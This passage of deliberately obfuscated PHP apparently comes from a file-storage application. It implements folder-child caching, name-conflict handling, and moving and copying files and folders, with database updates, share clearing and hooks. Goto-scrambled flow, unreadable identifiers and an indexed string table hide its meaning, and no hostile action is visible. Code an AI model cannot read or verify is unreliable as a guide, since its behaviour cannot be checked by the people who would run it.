$CÊÙ‘î»È·[437], $CÊÙ‘î»È·[370] => Pinyin::encode($e«˜”Úç¸, $CÊÙ‘î»È·[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($CéƒÆÍ ¾) { goto aá¯¯áŞ¦ó; aá¯¯áŞ¦ó: $Cğè¹À¦Ï¾ =& $_SERVER[¹Ò‹Ò¹]; $FÚŒÖÂŒä = $this->sourceInfo($CéƒÆÍ ¾); $a°„´¯Ş³ = $Cğè¹À¦Ï¾[418]; goto DÆá©²ØÏÖ; DÆá©²ØÏÖ: $f±µË¿¼ = array($Cğè¹À¦Ï¾[481] => array($Cğè¹À¦Ï¾[507], $FÚŒÖÂŒä[$Cğè¹À¦Ï¾[481]] . $CéƒÆÍ ¾ . $Cğè¹À¦Ï¾[508]), $Cğè¹À¦Ï¾[417] => $this->targetIsDelete); $AÈ­ê µ‚… = $this->field($a°„´¯Ş³)->where($f±µË¿¼)->select(); if (!$AÈ­ê µ‚…) { return; } goto d–—ˆÌÌÉÖ; d–—ˆÌÌÉÖ: $AÈ­ê µ‚… = array_to_keyvalue($AÈ­ê µ‚…, $Cğè¹À¦Ï¾[390]); foreach ($AÈ­ê µ‚… as $D‡Š‘èÂ…–) { $a‰ãÚ¹¶•¾ = $D‡Š‘èÂ…–[$Cğè¹À¦Ï¾[472]]; $CéƒÆÍ ¾ = $D‡Š‘èÂ…–[$Cğè¹À¦Ï¾[390]]; if (!isset($this->_childrenListCache[$CéƒÆÍ ¾]) && $D‡Š‘èÂ…–[$Cğè¹À¦Ï¾[397]] == $Cğè¹À¦Ï¾[86]) { $this->_childrenListCache[$CéƒÆÍ ¾] = array(); } if (!isset($this->_childrenListCache[$a‰ãÚ¹¶•¾])) { $this->_childrenListCache[$a‰ãÚ¹¶•¾] = array(); } $this->_childrenListCache[$a‰ãÚ¹¶•¾][$CéƒÆÍ ¾] = $D‡Š‘èÂ…–; $this->_childrenItemCache[$CéƒÆÍ ¾] = $D‡Š‘èÂ…–; } goto CÁõîî„Ÿ‚; CÁõîî„Ÿ‚: } private function _childrenListAll($EæĞ¾Ü¿œÆ, &$dó·èÆš†) { $eç½¿«×Ö” =& $_SERVER[¹Ò‹Ò¹]; if (!isset($this->_childrenListCache[$EæĞ¾Ü¿œÆ])) { return; } $a’„‘öìƒ¶ = $this->_childrenListCache[$EæĞ¾Ü¿œÆ]; foreach ($a’„‘öìƒ¶ as $bª´ÂŒœÄŠ => $eÁÆÔŠÅºÃ) { $dó·èÆš†[$bª´ÂŒœÄŠ] = $eÁÆÔŠÅºÃ; if ($eÁÆÔŠÅºÃ[$eç½¿«×Ö”[397]] == $eç½¿«×Ö”[86]) { $this->_childrenListAll($bª´ÂŒœÄŠ, $dó·èÆš†); } } } private function sourceInfoCache($E‰’óÔÃ†°) { if (isset($this->_childrenItemCache[$E‰’óÔÃ†°])) { return $this->_childrenItemCache[$E‰’óÔÃ†°]; } return $this->sourceInfo($E‰’óÔÃ†°); } private function _childrenList($CÇÕ–›ŞÔŞ) { if (isset($this->_childrenListCache[$CÇÕ–›ŞÔŞ])) { return $this->_childrenListCache[$CÇÕ–›ŞÔŞ]; } return $this->_childrenListSelect($CÇÕ–›ŞÔŞ); } private function _childrenListSelect($FÉ³øó¶ªÉ) { goto CÍÈëã–Ñ·; Fê¿Ç—: foreach ($dõ†³Áôøì as $FÉ³øó¶ªÉ => $aÃŞ†éÀ°) { $this->_childrenItemCache[$FÉ³øó¶ªÉ] = $aÃŞ†éÀ°; } return $dõ†³Áôøì; goto fŒé¸¬¸Ü; CÍÈëã–Ñ·: $E©®ÅŠÄ» =& $_SERVER[¹Ò‹Ò¹]; $FÃ³Ô£Ø = array($E©®ÅŠÄ»[472] => $FÉ³øó¶ªÉ, $E©®ÅŠÄ»[417] => $this->targetIsDelete); $BŸä¯ğË£× = $this->where($FÃ³Ô£Ø)->select(); goto B’˜¸À; B’˜¸À: $BŸä¯ğË£× = $BŸä¯ğË£× ? $BŸä¯ğË£× : array(); $dõ†³Áôøì = array_to_keyvalue($BŸä¯ğË£×, $E©®ÅŠÄ»[390]); $this->_childrenListCache[$FÉ³øó¶ªÉ] = $dõ†³Áôøì; goto Fê¿Ç—; fŒé¸¬¸Ü: } private function fileNameExistCache($C˜³¤§ß„“, $C‹‰Î ®ºÂ) { $BƒâœÅî­ =& $_SERVER[¹Ò‹Ò¹]; $C‹‰Î ®ºÂ = strtolower($C‹‰Î ®ºÂ); $f¢äâë¼®­ = $this->_childrenList($C˜³¤§ß„“); foreach ($f¢äâë¼®­ as $aîâ¯ÂŒëÒ) { if ($C‹‰Î ®ºÂ == strtolower($aîâ¯ÂŒëÒ[$BƒâœÅî­[28]])) { return $aîâ¯ÂŒëÒ[$BƒâœÅî­[390]]; } } return !1; } private function fileNameAutoCache($DÌš­„™õ·, $D²Î¯Éª, $Eù…ÕñÎñ½, $D¤æÒº„Ûº) { $b³ì½ïñÂ =& $_SERVER[¹Ò‹Ò¹]; $CÙ‘ë²ù¾ƒ = $this->_childrenList($DÌš­„™õ·); $bÀêŠ„öá = array_to_keyvalue($CÙ‘ë²ù¾ƒ, $b³ì½ïñÂ[33], $b³ì½ïñÂ[28]); return $this->fileNameAutoGet($bÀêŠ„öá, $D²Î¯Éª, $Eù…ÕñÎñ½, $D¤æÒº„Ûº); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($fù­ó³²…, $cĞ×‰ƒ†ù, $dÁøÙÑá„Ç = REPEAT_REPLACE, $C´±á°š« = '') { goto D×†î‚ØïØ; bĞÖÁ™Ş®Â: $this->lockMoveEnd($fù­ó³²…); $this->lockWriteEnd($cĞ×‰ƒ†ù, $C¡£˜‹Ç©); $this->folderSizeReset($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[472]]); goto bª›‰ÈÔ; cŒ·åñî¨²: $a©ÛÚÏ¸ = $this->fileNameExistCache($cĞ×‰ƒ†ù, $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[28]]); $EöÃ®«»„ = $this->_move($fù­ó³²…, $cĞ×‰ƒ†ù, $dÁøÙÑá„Ç, $fœ×¨ºò–ç, $C´±á°š«); $this->sourceCacheClear(); goto bÛñ»«ÂÑÚ; aˆÏ•½ôß°: if ($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[472]] == $cĞ×‰ƒ†ù && $C´±á°š« != $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[28]]) { $CŞ‡ºéÆÔš = $this->fileNameExist($cĞ×‰ƒ†ù, $C´±á°š«); if ($CŞ‡ºéÆÔš && $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[397]] == $D¸¯ö¿İåÏ[491]) { goto AİÊ¹¹æóÄ; Dˆˆ÷ª£ˆ: $this->removeNow($fù­ó³²…, !1); $this->folderSizeReset($cĞ×‰ƒ†ù); Hook::trigger($D¸¯ö¿İåÏ[554], $BîŸ„‡”ÕÜ); goto AÛİ„™ğæŞ; AÛİ„™ğæŞ: return $CŞ‡ºéÆÔš; goto c¨÷ğä´Õ; AİÊ¹¹æóÄ: $fÀâ‹Íå” = $this->sourceInfo($CŞ‡ºéÆÔš); $bÉ ¨˜öõ‡ = $this->fileHistory($fÀâ‹Íå”, $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[441]], $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[77]]); if (!$bÉ ¨˜öõ‡) { Model($D¸¯ö¿İåÏ[444])->remove($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[441]]); } goto Dˆˆ÷ª£ˆ; c¨÷ğä´Õ: } } $C¡£˜‹Ç© = $C´±á°š« ? $C´±á°š« : $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[28]]; $this->lockMoveStart($fù­ó³²…); goto eŒ²ãŞÓ÷¸; D˜˜’´ŒÍé: if ($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[472]] == $EöÌˆ°ä’[$D¸¯ö¿İåÏ[390]]) { if ($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[417]] == $D¸¯ö¿İåÏ[86]) { Model($D¸¯ö¿İåÏ[415])->restore(array($fù­ó³²…)); } if (!$C´±á°š« || $C´±á°š« == $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[28]]) { return $fù­ó³²…; } } $BîŸ„‡”ÕÜ = $this->pathInfoMore($fù­ó³²…); if ($this->isParentOf($fù­ó³²…, $cĞ×‰ƒ†ù)) { return !1; } goto a¹¤‹‹½„ì; dÏ£ÑŸß°š: return $EöÃ®«»„; goto a„¿öäË«; eŒ²ãŞÓ÷¸: $this->lockWriteStart($cĞ×‰ƒ†ù, $C¡£˜‹Ç©); $fœ×¨ºò–ç = array($D¸¯ö¿İåÏ[524] => array(), $D¸¯ö¿İåÏ[555] => !1); $this->clearShare($fù­ó³²…, $cĞ×‰ƒ†ù); goto cŒ·åñî¨²; aºÌ¸ìä¡: $this->updateModifyTime($fÈâèŒ¿ßÎ); Model($D¸¯ö¿İåÏ[528])->eventMove($fù­ó³²…, $Aš»ƒì„’Â[$D¸¯ö¿İåÏ[472]], $cĞ×‰ƒ†ù); Hook::trigger($D¸¯ö¿İåÏ[554], $BîŸ„‡”ÕÜ); goto dÏ£ÑŸß°š; bª›‰ÈÔ: $this->folderSizeReset($cĞ×‰ƒ†ù); $fÈâèŒ¿ßÎ = array($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[472]], $cĞ×‰ƒ†ù); if ($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[397]] == $D¸¯ö¿İåÏ[86]) { $fÈâèŒ¿ßÎ[] = $fù­ó³²…; } goto aºÌ¸ìä¡; bÛñ»«ÂÑÚ: if ($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[397]] == $D¸¯ö¿İåÏ[86] && $a©ÛÚÏ¸) { $this->folderSizeResetChildren($EöÃ®«»„); } Model($D¸¯ö¿İåÏ[191])->linkAdd($fœ×¨ºò–ç[$D¸¯ö¿İåÏ[524]]); if ($a©ÛÚÏ¸ && $fœ×¨ºò–ç[$D¸¯ö¿İåÏ[555]]) { $this->removeNow($fù­ó³²…, !1); } goto bĞÖÁ™Ş®Â; a¹¤‹‹½„ì: if (!$Aš»ƒì„’Â || !$EöÌˆ°ä’ || $EöÌˆ°ä’[$D¸¯ö¿İåÏ[397]] != $D¸¯ö¿İåÏ[86]) { return !1; } Hook::trigger($D¸¯ö¿İåÏ[553], $BîŸ„‡”ÕÜ); $this->targetIsDelete = intval($Aš»ƒì„’Â[$D¸¯ö¿İåÏ[417]]); goto aˆÏ•½ôß°; D×†î‚ØïØ: $D¸¯ö¿İåÏ =& $_SERVER[¹Ò‹Ò¹]; $Aš»ƒì„’Â = $this->sourceInfo($fù­ó³²…); $EöÌˆ°ä’ = $this->sourceInfo($cĞ×‰ƒ†ù); goto D˜˜’´ŒÍé; a„¿öäË«: } private function _move($C‘óÏŒÌ–Í, $A‰ÕÈ‰Ÿ¸’, $D‘ÄˆÄˆĞ, &$FÊ™È¯¨õ…, $A»ÔéëŒ­• = '') { goto c‰¸Ø…à±; c‰¸Ø…à±: $aˆº‰“³Å =& $_SERVER[¹Ò‹Ò¹]; $eøˆåÛ¼²Å = $this->sourceInfo($C‘óÏŒÌ–Í); $cŠ¯óÌ’œ­ = $eøˆåÛ¼²Å[$aˆº‰“³Å[397]] == $aˆº‰“³Å[86]; goto E£ÀÛ¦Ÿø¢; E£ÀÛ¦Ÿø¢: $CÊ˜ÁŞãî“ = $A»ÔéëŒ­• ? $A»ÔéëŒ­• : $eøˆåÛ¼²Å[$aˆº‰“³Å[28]]; $aõ†ã¦§‘Ä = $this->fileNameExistCache($A‰ÕÈ‰Ÿ¸’, $CÊ˜ÁŞãî“); $this->lockMoveStart($C‘óÏŒÌ–Í); goto DàäñÔ­©Ø; B¹÷íÎÌ—³: $D„¬õ©»Ä‘ = !1; if ($cŠ¯óÌ’œ­) { if ($D‘ÄˆÄˆĞ == REPEAT_RENAME_FOLDER) { $CÊ˜ÁŞãî“ = $this->fileNameAuto($A‰ÕÈ‰Ÿ¸’, $CÊ˜ÁŞãî“, $D‘ÄˆÄˆĞ, $cŠ¯óÌ’œ­); $A¯à—–«´¢ = $this->_moveForce($C‘óÏŒÌ–Í, $A‰ÕÈ‰Ÿ¸’, $CÊ˜ÁŞãî“); } else { if ($D‘ÄˆÄˆĞ == REPEAT_RENAME_FOLDER) { $D‘ÄˆÄˆĞ = REPEAT_RENAME; } $Aó‚ç…ÖÂÖ = $this->_childrenListSelect($C‘óÏŒÌ–Í); foreach ($Aó‚ç…ÖÂÖ as $BÓË©øò£‰) { $this->_move($BÓË©øò£‰[$aˆº‰“³Å[390]], $aõ†ã¦§‘Ä, $D‘ÄˆÄˆĞ, $FÊ™È¯¨õ…); } $D„¬õ©»Ä‘ = !0; } } else { if ($D‘ÄˆÄˆĞ == REPEAT_SKIP) { $D„¬õ©»Ä‘ = !0; } else { if ($D‘ÄˆÄˆĞ == REPEAT_RENAME || $D‘ÄˆÄˆĞ == REPEAT_RENAME_FOLDER) { $CÊ˜ÁŞãî“ = $this->fileNameAuto($A‰ÕÈ‰Ÿ¸’, $CÊ˜ÁŞãî“, $D‘ÄˆÄˆĞ, $cŠ¯óÌ’œ­); $A¯à—–«´¢ = $this->_moveForce($C‘óÏŒÌ–Í, $A‰ÕÈ‰Ÿ¸’, $CÊ˜ÁŞãî“); } else { if ($D‘ÄˆÄˆĞ == REPEAT_REPLACE) { $b©Ÿó„º› = $this->sourceInfoCache($aõ†ã¦§‘Ä); $e–„ù›Ü‚‰ = $this->fileHistory($b©Ÿó„º›, $eøˆåÛ¼²Å[$aˆº‰“³Å[441]], $eøˆåÛ¼²Å[$aˆº‰“³Å[77]]); if ($e–„ù›Ü‚‰) { $FÊ™È¯¨õ…[$aˆº‰“³Å[524]][] = $eøˆåÛ¼²Å[$aˆº‰“³Å[441]]; } else { $D„¬õ©»Ä‘ = !0; } } } } } if ($D„¬õ©»Ä‘ && !$FÊ™È¯¨õ…[$aˆº‰“³Å[555]]) { $FÊ™È¯¨õ…[$aˆº‰“³Å[555]] = !0; } goto dÌ¥·Á½™Ş; dÌ¥·Á½™Ş: return $A¯à—–«´¢; goto e¨Š÷Ê‰Ò; DàäñÔ­©Ø: $this->lockWriteStart($A‰ÕÈ‰Ÿ¸’, $CÊ˜ÁŞãî“); if (!$aõ†ã¦§‘Ä) { return $this->_moveForce($C‘óÏŒÌ–Í, $A‰ÕÈ‰Ÿ¸’, $CÊ˜ÁŞãî“); } $A¯à—–«´¢ = $aõ†ã¦§‘Ä; goto B¹÷íÎÌ—³; e¨Š÷Ê‰Ò: } private function _moveForce($B´È¤‘é, $dñ”–÷ä”, $e°Å¼ê¬¤) { goto c“²É¹«ù; c“²É¹«ù: $c¡Áš…÷ =& $_SERVER[¹Ò‹Ò¹]; $Dèëğ±²ÚË = $this->sourceInfo($B´È¤‘é); $d÷Ğ¾Ş¿Ëë = $this->sourceInfo($dñ”–÷ä”); goto FîóãëŞ; aÚƒæ‹±: if (!$d‚‹éÁ¢ƒÜ && $this->moveClearAuth) { Model($c¡Áš…÷[476])->authClear($B´È¤‘é); } $D­’ ¿¥Ø± = $Dèëğ±²ÚË[$c¡Áš…÷[417]] == $c¡Áš…÷[86] && $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[417]] != $c¡Áš…÷[86]; if ($D­’ ¿¥Ø±) { $F”™öñó[$c¡Áš…÷[416]] = 0; } goto BÏÎòç‘á—; BÏÎòç‘á—: if ($aˆÉø†¤Ÿ) { $aŠŠŒìçƒ = array($c¡Áš…÷[548] => array($c¡Áš…÷[507], $Dèëğ±²ÚË[$c¡Áš…÷[481]] . $Dèëğ±²ÚË[$c¡Áš…÷[390]] . $c¡Áš…÷[508])); $CàÆÀÓëÕ = $Dèëğ±²ÚË[$c¡Áš…÷[481]] . $Dèëğ±²ÚË[$c¡Áš…÷[390]] . $c¡Áš…÷[47]; $E÷ ÜÔºË = $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[481]] . $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[390]] . $c¡Áš…÷[47] . $Dèëğ±²ÚË[$c¡Áš…÷[390]] . $c¡Áš…÷[47]; $BæÎõĞÎÕ« = array($c¡Áš…÷[548] => array($c¡Áš…÷[556], "\162\145\x70\154\141\x63\x65\50\160\141\162\145\x6e\x74\114\x65\166\x65\154\54\x27{$CàÆÀÓëÕ}\x27\54\47{$E÷ ÜÔºË}\47\x29"), $c¡Áš…÷[544] => $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[398]], $c¡Áš…÷[545] => $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[478]]); if ($D­’ ¿¥Ø±) { $BæÎõĞÎÕ«[$c¡Áš…÷[416]] = 0; } $this->where($aŠŠŒìçƒ)->data($BæÎõĞÎÕ«)->save(); } $this->where(array($c¡Áš…÷[404] => $B´È¤‘é))->data($F”™öñó)->save(); return $B´È¤‘é; goto a­İ†àÇìÎ; FîóãëŞ: $aˆÉø†¤Ÿ = $Dèëğ±²ÚË[$c¡Áš…÷[397]] == $c¡Áš…÷[86]; $F”™öñó = array($c¡Áš…÷[389] => $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[390]], $c¡Áš…÷[548] => $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[481]] . $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[390]] . $c¡Áš…÷[47], $c¡Áš…÷[544] => $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[398]], $c¡Áš…÷[545] => $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[478]], $c¡Áš…÷[547] => USER_ID, $c¡Áš…÷[407] => $e°Å¼ê¬¤); $d‚‹éÁ¢ƒÜ = $Dèëğ±²ÚË[$c¡Áš…÷[398]] == SourceModel::TYPE_GROUP && $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[398]] == SourceModel::TYPE_GROUP && $Dèëğ±²ÚË[$c¡Áš…÷[478]] == $d÷Ğ¾Ş¿Ëë[$c¡Áš…÷[478]]; goto aÚƒæ‹±; a­İ†àÇìÎ: } private function clearShare($AÔ’–Ù¥‹º, $fùÔÖùÀšˆ) { goto AÖŞÔ™æÓë; D‡øó‰Ÿ‹: if ($e»áàÅç–õ[$Eõ‚ÔæŞÑ[478]] == $Eç‘±’Ş¨[$Eõ‚ÔæŞÑ[478]] && $e»áàÅç–õ[$Eõ‚ÔæŞÑ[398]] == $Eõ‚ÔæŞÑ[557]) { return; } $dÙ·²òÕÒ = array($Eõ‚ÔæŞÑ[481] => array($Eõ‚ÔæŞÑ[507], $e»áàÅç–õ[$Eõ‚ÔæŞÑ[481]] . $AÔ’–Ù¥‹º . $Eõ‚ÔæŞÑ[508])); $cì“˜ßªÁ = $this->field($Eõ‚ÔæŞÑ[404])->where($dÙ·²òÕÒ)->getField($Eõ‚ÔæŞÑ[390], !0); goto f®Ñ¯Õ¨˜³; f®Ñ¯Õ¨˜³: if (!$cì“˜ßªÁ) { return; } $dÙ·²òÕÒ = array($Eõ‚ÔæŞÑ[390] => array($Eõ‚ÔæŞÑ[7], $cì“˜ßªÁ), $Eõ‚ÔæŞÑ[469] => 1); $FË¤Á°‹“ = Model($Eõ‚ÔæŞÑ[558])->field($Eõ‚ÔæŞÑ[462])->where($dÙ·²òÕÒ)->select(); goto f£¤œÙ§Ë¶; AÖŞÔ™æÓë: $Eõ‚ÔæŞÑ =& $_SERVER[¹Ò‹Ò¹]; $e»áàÅç–õ = $this->sourceInfo($AÔ’–Ù¥‹º); $Eç‘±’Ş¨ = $this->sourceInfo($fùÔÖùÀšˆ); goto D‡øó‰Ÿ‹; D°ºÚŠ¿‚î: Model($Eõ‚ÔæŞÑ[558])->where($dÙ·²òÕÒ)->save(array($Eõ‚ÔæŞÑ[469] => 0)); Model($Eõ‚ÔæŞÑ[559])->where($dÙ·²òÕÒ)->delete(); goto d¾Î² ğŠ‰; f£¤œÙ§Ë¶: if (!$FË¤Á°‹“) { return; } $FË¤Á°‹“ = array_to_keyvalue($FË¤Á°‹“, $Eõ‚ÔæŞÑ[33], $Eõ‚ÔæŞÑ[462]); $dÙ·²òÕÒ = array($Eõ‚ÔæŞÑ[462] => array($Eõ‚ÔæŞÑ[7], $FË¤Á°‹“)); goto D°ºÚŠ¿‚î; d¾Î² ğŠ‰: } public function copyFolderFromIO($cÍé ÛÎ„†, $aÁ²ù§ ¨”, $CÎĞİ¶ğï¤, $aìáâ“¤¬Ç, $c¾›¼ÄŠÍ, $C×Ğç‰¬¥¶ = false) { goto E¡¯‚„½ö; DÂ­â‡Ø¿¸: $this->updateModifyTime($CÎĞİ¶ğï¤); return $c‰±ƒëÆø; goto EØºÊ¢‹†Â; d•àÜË : if ($A«Å‹ø›öŸ) { $this->_childrenAllMake($A«Å‹ø›öŸ); } Hook::trigger($EÈŒÏœ²[561]); $this->_copyChildTo($cÍé ÛÎ„†, $aÁ²ù§ ¨”, $c‰±ƒëÆø, $aìáâ“¤¬Ç, $E°¶‚õÇğ”, $c¾›¼ÄŠÍ); goto FˆóŞàæ‘Ä; e›ÈË¾ì§: $A«Å‹ø›öŸ = $this->fileNameExist($CÎĞİ¶ğï¤, $cìÑˆ¬ñò¤); $c‰±ƒëÆø = $this->mkdir($CÎĞİ¶ğï¤, $cìÑˆ¬ñò¤, $aìáâ“¤¬Ç); if (!$A«Å‹ø›öŸ || $aìáâ“¤¬Ç == REPEAT_RENAME_FOLDER) { $aìáâ“¤¬Ç = !1; } goto d•àÜË ; B¹áµÉ¦­: Model($EÈŒÏœ²[527])->addAll($E°¶‚õÇğ”[$EÈŒÏœ²[525]], array(), !0); Model($EÈŒÏœ²[528])->eventCopy($c‰±ƒëÆø); $this->saveAll($E°¶‚õÇğ”[$EÈŒÏœ²[526]]); goto E»š×­ò £; FˆóŞàæ‘Ä: Hook::trigger($EÈŒÏœ²[562]); if ($c‰±ƒëÆø) { $this->folderSizeResetChildren($c‰±ƒëÆø); } $this->_childrenListClear(); goto B¹áµÉ¦­; E»š×­ò £: Model($EÈŒÏœ²[444])->linkAdd($E°¶‚õÇğ”[$EÈŒÏœ²[524]]); Model($EÈŒÏœ²[444])->remove($E°¶‚õÇğ”[$EÈŒÏœ²[560]]); $this->folderSizeReset($CÎĞİ¶ğï¤); goto DÂ­â‡Ø¿¸; E¡¯‚„½ö: $EÈŒÏœ² =& $_SERVER[¹Ò‹Ò¹]; $E°¶‚õÇğ” = array($EÈŒÏœ²[525] => array(), $EÈŒÏœ²[526] => array(), $EÈŒÏœ²[524] => array(), $EÈŒÏœ²[560] => array()); $cìÑˆ¬ñò¤ = $C×Ğç‰¬¥¶ ? $C×Ğç‰¬¥¶ : $cÍé ÛÎ„†->pathThis($aÁ²ù§ ¨”); goto e›ÈË¾ì§; EØºÊ¢‹†Â: } private function _copyChildTo($dõÏ‹ù® ã, $EŒÒŸ„¢Ëó, $bŠİëÕ¡ğ‹, $FÇŠÕŠËÚÜ, &$eøŞääª®õ, $cÎˆºÜÑå•) { goto A¯„ÊÒÅŞø; d‚Ó±–õ¬: if (!empty($cØŸÀ“†”)) { $this->addAll($cØŸÀ“†”); $this->_childrenListSelect($bŠİëÕ¡ğ‹); } $c…Æˆé¥ª = $this->_childrenList($bŠİëÕ¡ğ‹); $c…Æˆé¥ª = array_to_keyvalue($c…Æˆé¥ª, $e‚¬¼Ö‹Êè[28]); goto Dñ¯«Êğ; A¯„ÊÒÅŞø: $e‚¬¼Ö‹Êè =& $_SERVER[¹Ò‹Ò¹]; $d…â½èá¾· = $this->sourceInfoCache($bŠİëÕ¡ğ‹); $a·²Œ•Õ¦¡ = $dõÏ‹ù® ã->listPath($EŒÒŸ„¢Ëó); goto AÑÛÜ¾±‰; Dñ¯«Êğ: foreach ($dÍÂÊğ÷ù as $DñŠ×†—¨º) { $aî®‹²“‹± = $c…Æˆé¥ª[$DñŠ×†—¨º[$e‚¬¼Ö‹Êè[28]]]; $c¸¯‚ÔäÊ = $aî®‹²“‹±[$e‚¬¼Ö‹Êè[390]]; $this->_copyApplyMeta($aî®‹²“‹±, $eøŞääª®õ); if ($DñŠ×†—¨º[$e‚¬¼Ö‹Êè[29]] == $e‚¬¼Ö‹Êè[76]) { $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[75]] = $dõÏ‹ù® ã->getPathInner($DñŠ×†—¨º[$e‚¬¼Ö‹Êè[75]]); $this->_copyChildTo($dõÏ‹ù® ã, $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[75]], $c¸¯‚ÔäÊ, $FÇŠÕŠËÚÜ, $eøŞääª®õ, $cÎˆºÜÑå•); } } goto c¾ƒ”ÄÙí†; AÑÛÜ¾±‰: $a·²Œ•Õ¦¡ = $a·²Œ•Õ¦¡ ? $a·²Œ•Õ¦¡ : array($e‚¬¼Ö‹Êè[73] => array(), $e‚¬¼Ö‹Êè[74] => array()); $dÍÂÊğ÷ù = array_merge($a·²Œ•Õ¦¡[$e‚¬¼Ö‹Êè[73]], $a·²Œ•Õ¦¡[$e‚¬¼Ö‹Êè[74]]); $eôâîïô® = $this->_addFiles($dõÏ‹ù® ã, $a·²Œ•Õ¦¡[$e‚¬¼Ö‹Êè[73]], $cÎˆºÜÑå•); goto c‡¿ñš­º¤; c‡¿ñš­º¤: $cØŸÀ“†” = array(); foreach ($dÍÂÊğ÷ù as &$DñŠ×†—¨º) { goto a®ê®´ëÚè; C‹£¯¤´ç”: $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[77]] = _get($DñŠ×†—¨º, $e‚¬¼Ö‹Êè[77], 0); $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[441]] = _get($DñŠ×†—¨º, $e‚¬¼Ö‹Êè[441], 0); if (!isset($DñŠ×†—¨º[$e‚¬¼Ö‹Êè[563]]) && $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[441]]) { $eøŞääª®õ[$e‚¬¼Ö‹Êè[560]][] = $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[441]]; } goto d¤´²‡Ú³¶; d¤´²‡Ú³¶: if ($FÇŠÕŠËÚÜ) { $a…Ñïˆ…Ûó = $this->fileNameExistCache($bŠİëÕ¡ğ‹, $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[28]]); if ($a…Ñïˆ…Ûó) { if ($DñŠ×†—¨º[$e‚¬¼Ö‹Êè[397]] || $FÇŠÕŠËÚÜ == REPEAT_SKIP) { continue; } if ($FÇŠÕŠËÚÜ == REPEAT_REPLACE) { $aî®‹²“‹± = $this->sourceInfoCache($a…Ñïˆ…Ûó); $Bá”­’¥Ä = $this->fileHistory($aî®‹²“‹±, $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[441]], $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[77]]); if ($Bá”­’¥Ä) { $eøŞääª®õ[$e‚¬¼Ö‹Êè[524]][] = $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[441]]; } continue; } else { if ($FÇŠÕŠËÚÜ == REPEAT_RENAME) { $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[28]] = $this->fileNameAutoCache($bŠİëÕ¡ğ‹, $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[28]], $FÇŠÕŠËÚÜ, !1); } } } } if (!$DñŠ×†—¨º[$e‚¬¼Ö‹Êè[397]] && $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[441]]) { $eøŞääª®õ[$e‚¬¼Ö‹Êè[524]][] = $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[441]]; } $cØŸÀ“†”[] = $this->_makeItemData($DñŠ×†—¨º, $d…â½èá¾·, $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[28]]); goto CùªÓ‘Ş•Ì; a®ê®´ëÚè: if (isset($eôâîïô®[$DñŠ×†—¨º[$e‚¬¼Ö‹Êè[28]]])) { $DñŠ×†—¨º = $eôâîïô®[$DñŠ×†—¨º[$e‚¬¼Ö‹Êè[28]]]; } $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[397]] = $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[29]] == $e‚¬¼Ö‹Êè[76]; $DñŠ×†—¨º[$e‚¬¼Ö‹Êè[399]] = _get($DñŠ×†—¨º, $e‚¬¼Ö‹Êè[167], $e‚¬¼Ö‹Êè[33]); goto C‹£¯¤´ç”; CùªÓ‘Ş•Ì: } unset($DñŠ×†—¨º); goto d‚Ó±–õ¬; c¾ƒ”ÄÙí†: } private function _addFiles($d†”à¢¬‹°, $C‚ñÊù‹ˆ´, $bõèˆøä°ª) { goto f íÕƒË¿Â; E×˜äÌ˜‹: $cºœ§×æğ->addAll($FŒ¸®Ñâ„ª); $fŸæì¶ÍŸ¤ = array($B°Ó»ñ¹áŞ[169] => array($B°Ó»ñ¹áŞ[7], array_keys($DÉÜ‹·Ç¦µ))); $cÆåÒ¹Ìµ† = $cºœ§×æğ->where($fŸæì¶ÍŸ¤)->select(); goto cíôÊ¦´£Ã; f íÕƒË¿Â: $B°Ó»ñ¹áŞ =& $_SERVER[¹Ò‹Ò¹]; if (!$C‚ñÊù‹ˆ´ || count($C‚ñÊù‹ˆ´) == 0) { return array(); } $DÉÜ‹·Ç¦µ = array(); goto Cƒ†§Ê½ñÃ; cíôÊ¦´£Ã: $cÆåÒ¹Ìµ† = $cÆåÒ¹Ìµ† ? $cÆåÒ¹Ìµ† : array(); foreach ($cÆåÒ¹Ìµ† as $E÷ë‘õğÉ) { if (!isset($DÉÜ‹·Ç¦µ[$E÷ë‘õğÉ[$B°Ó»ñ¹áŞ[169]]])) { continue; } 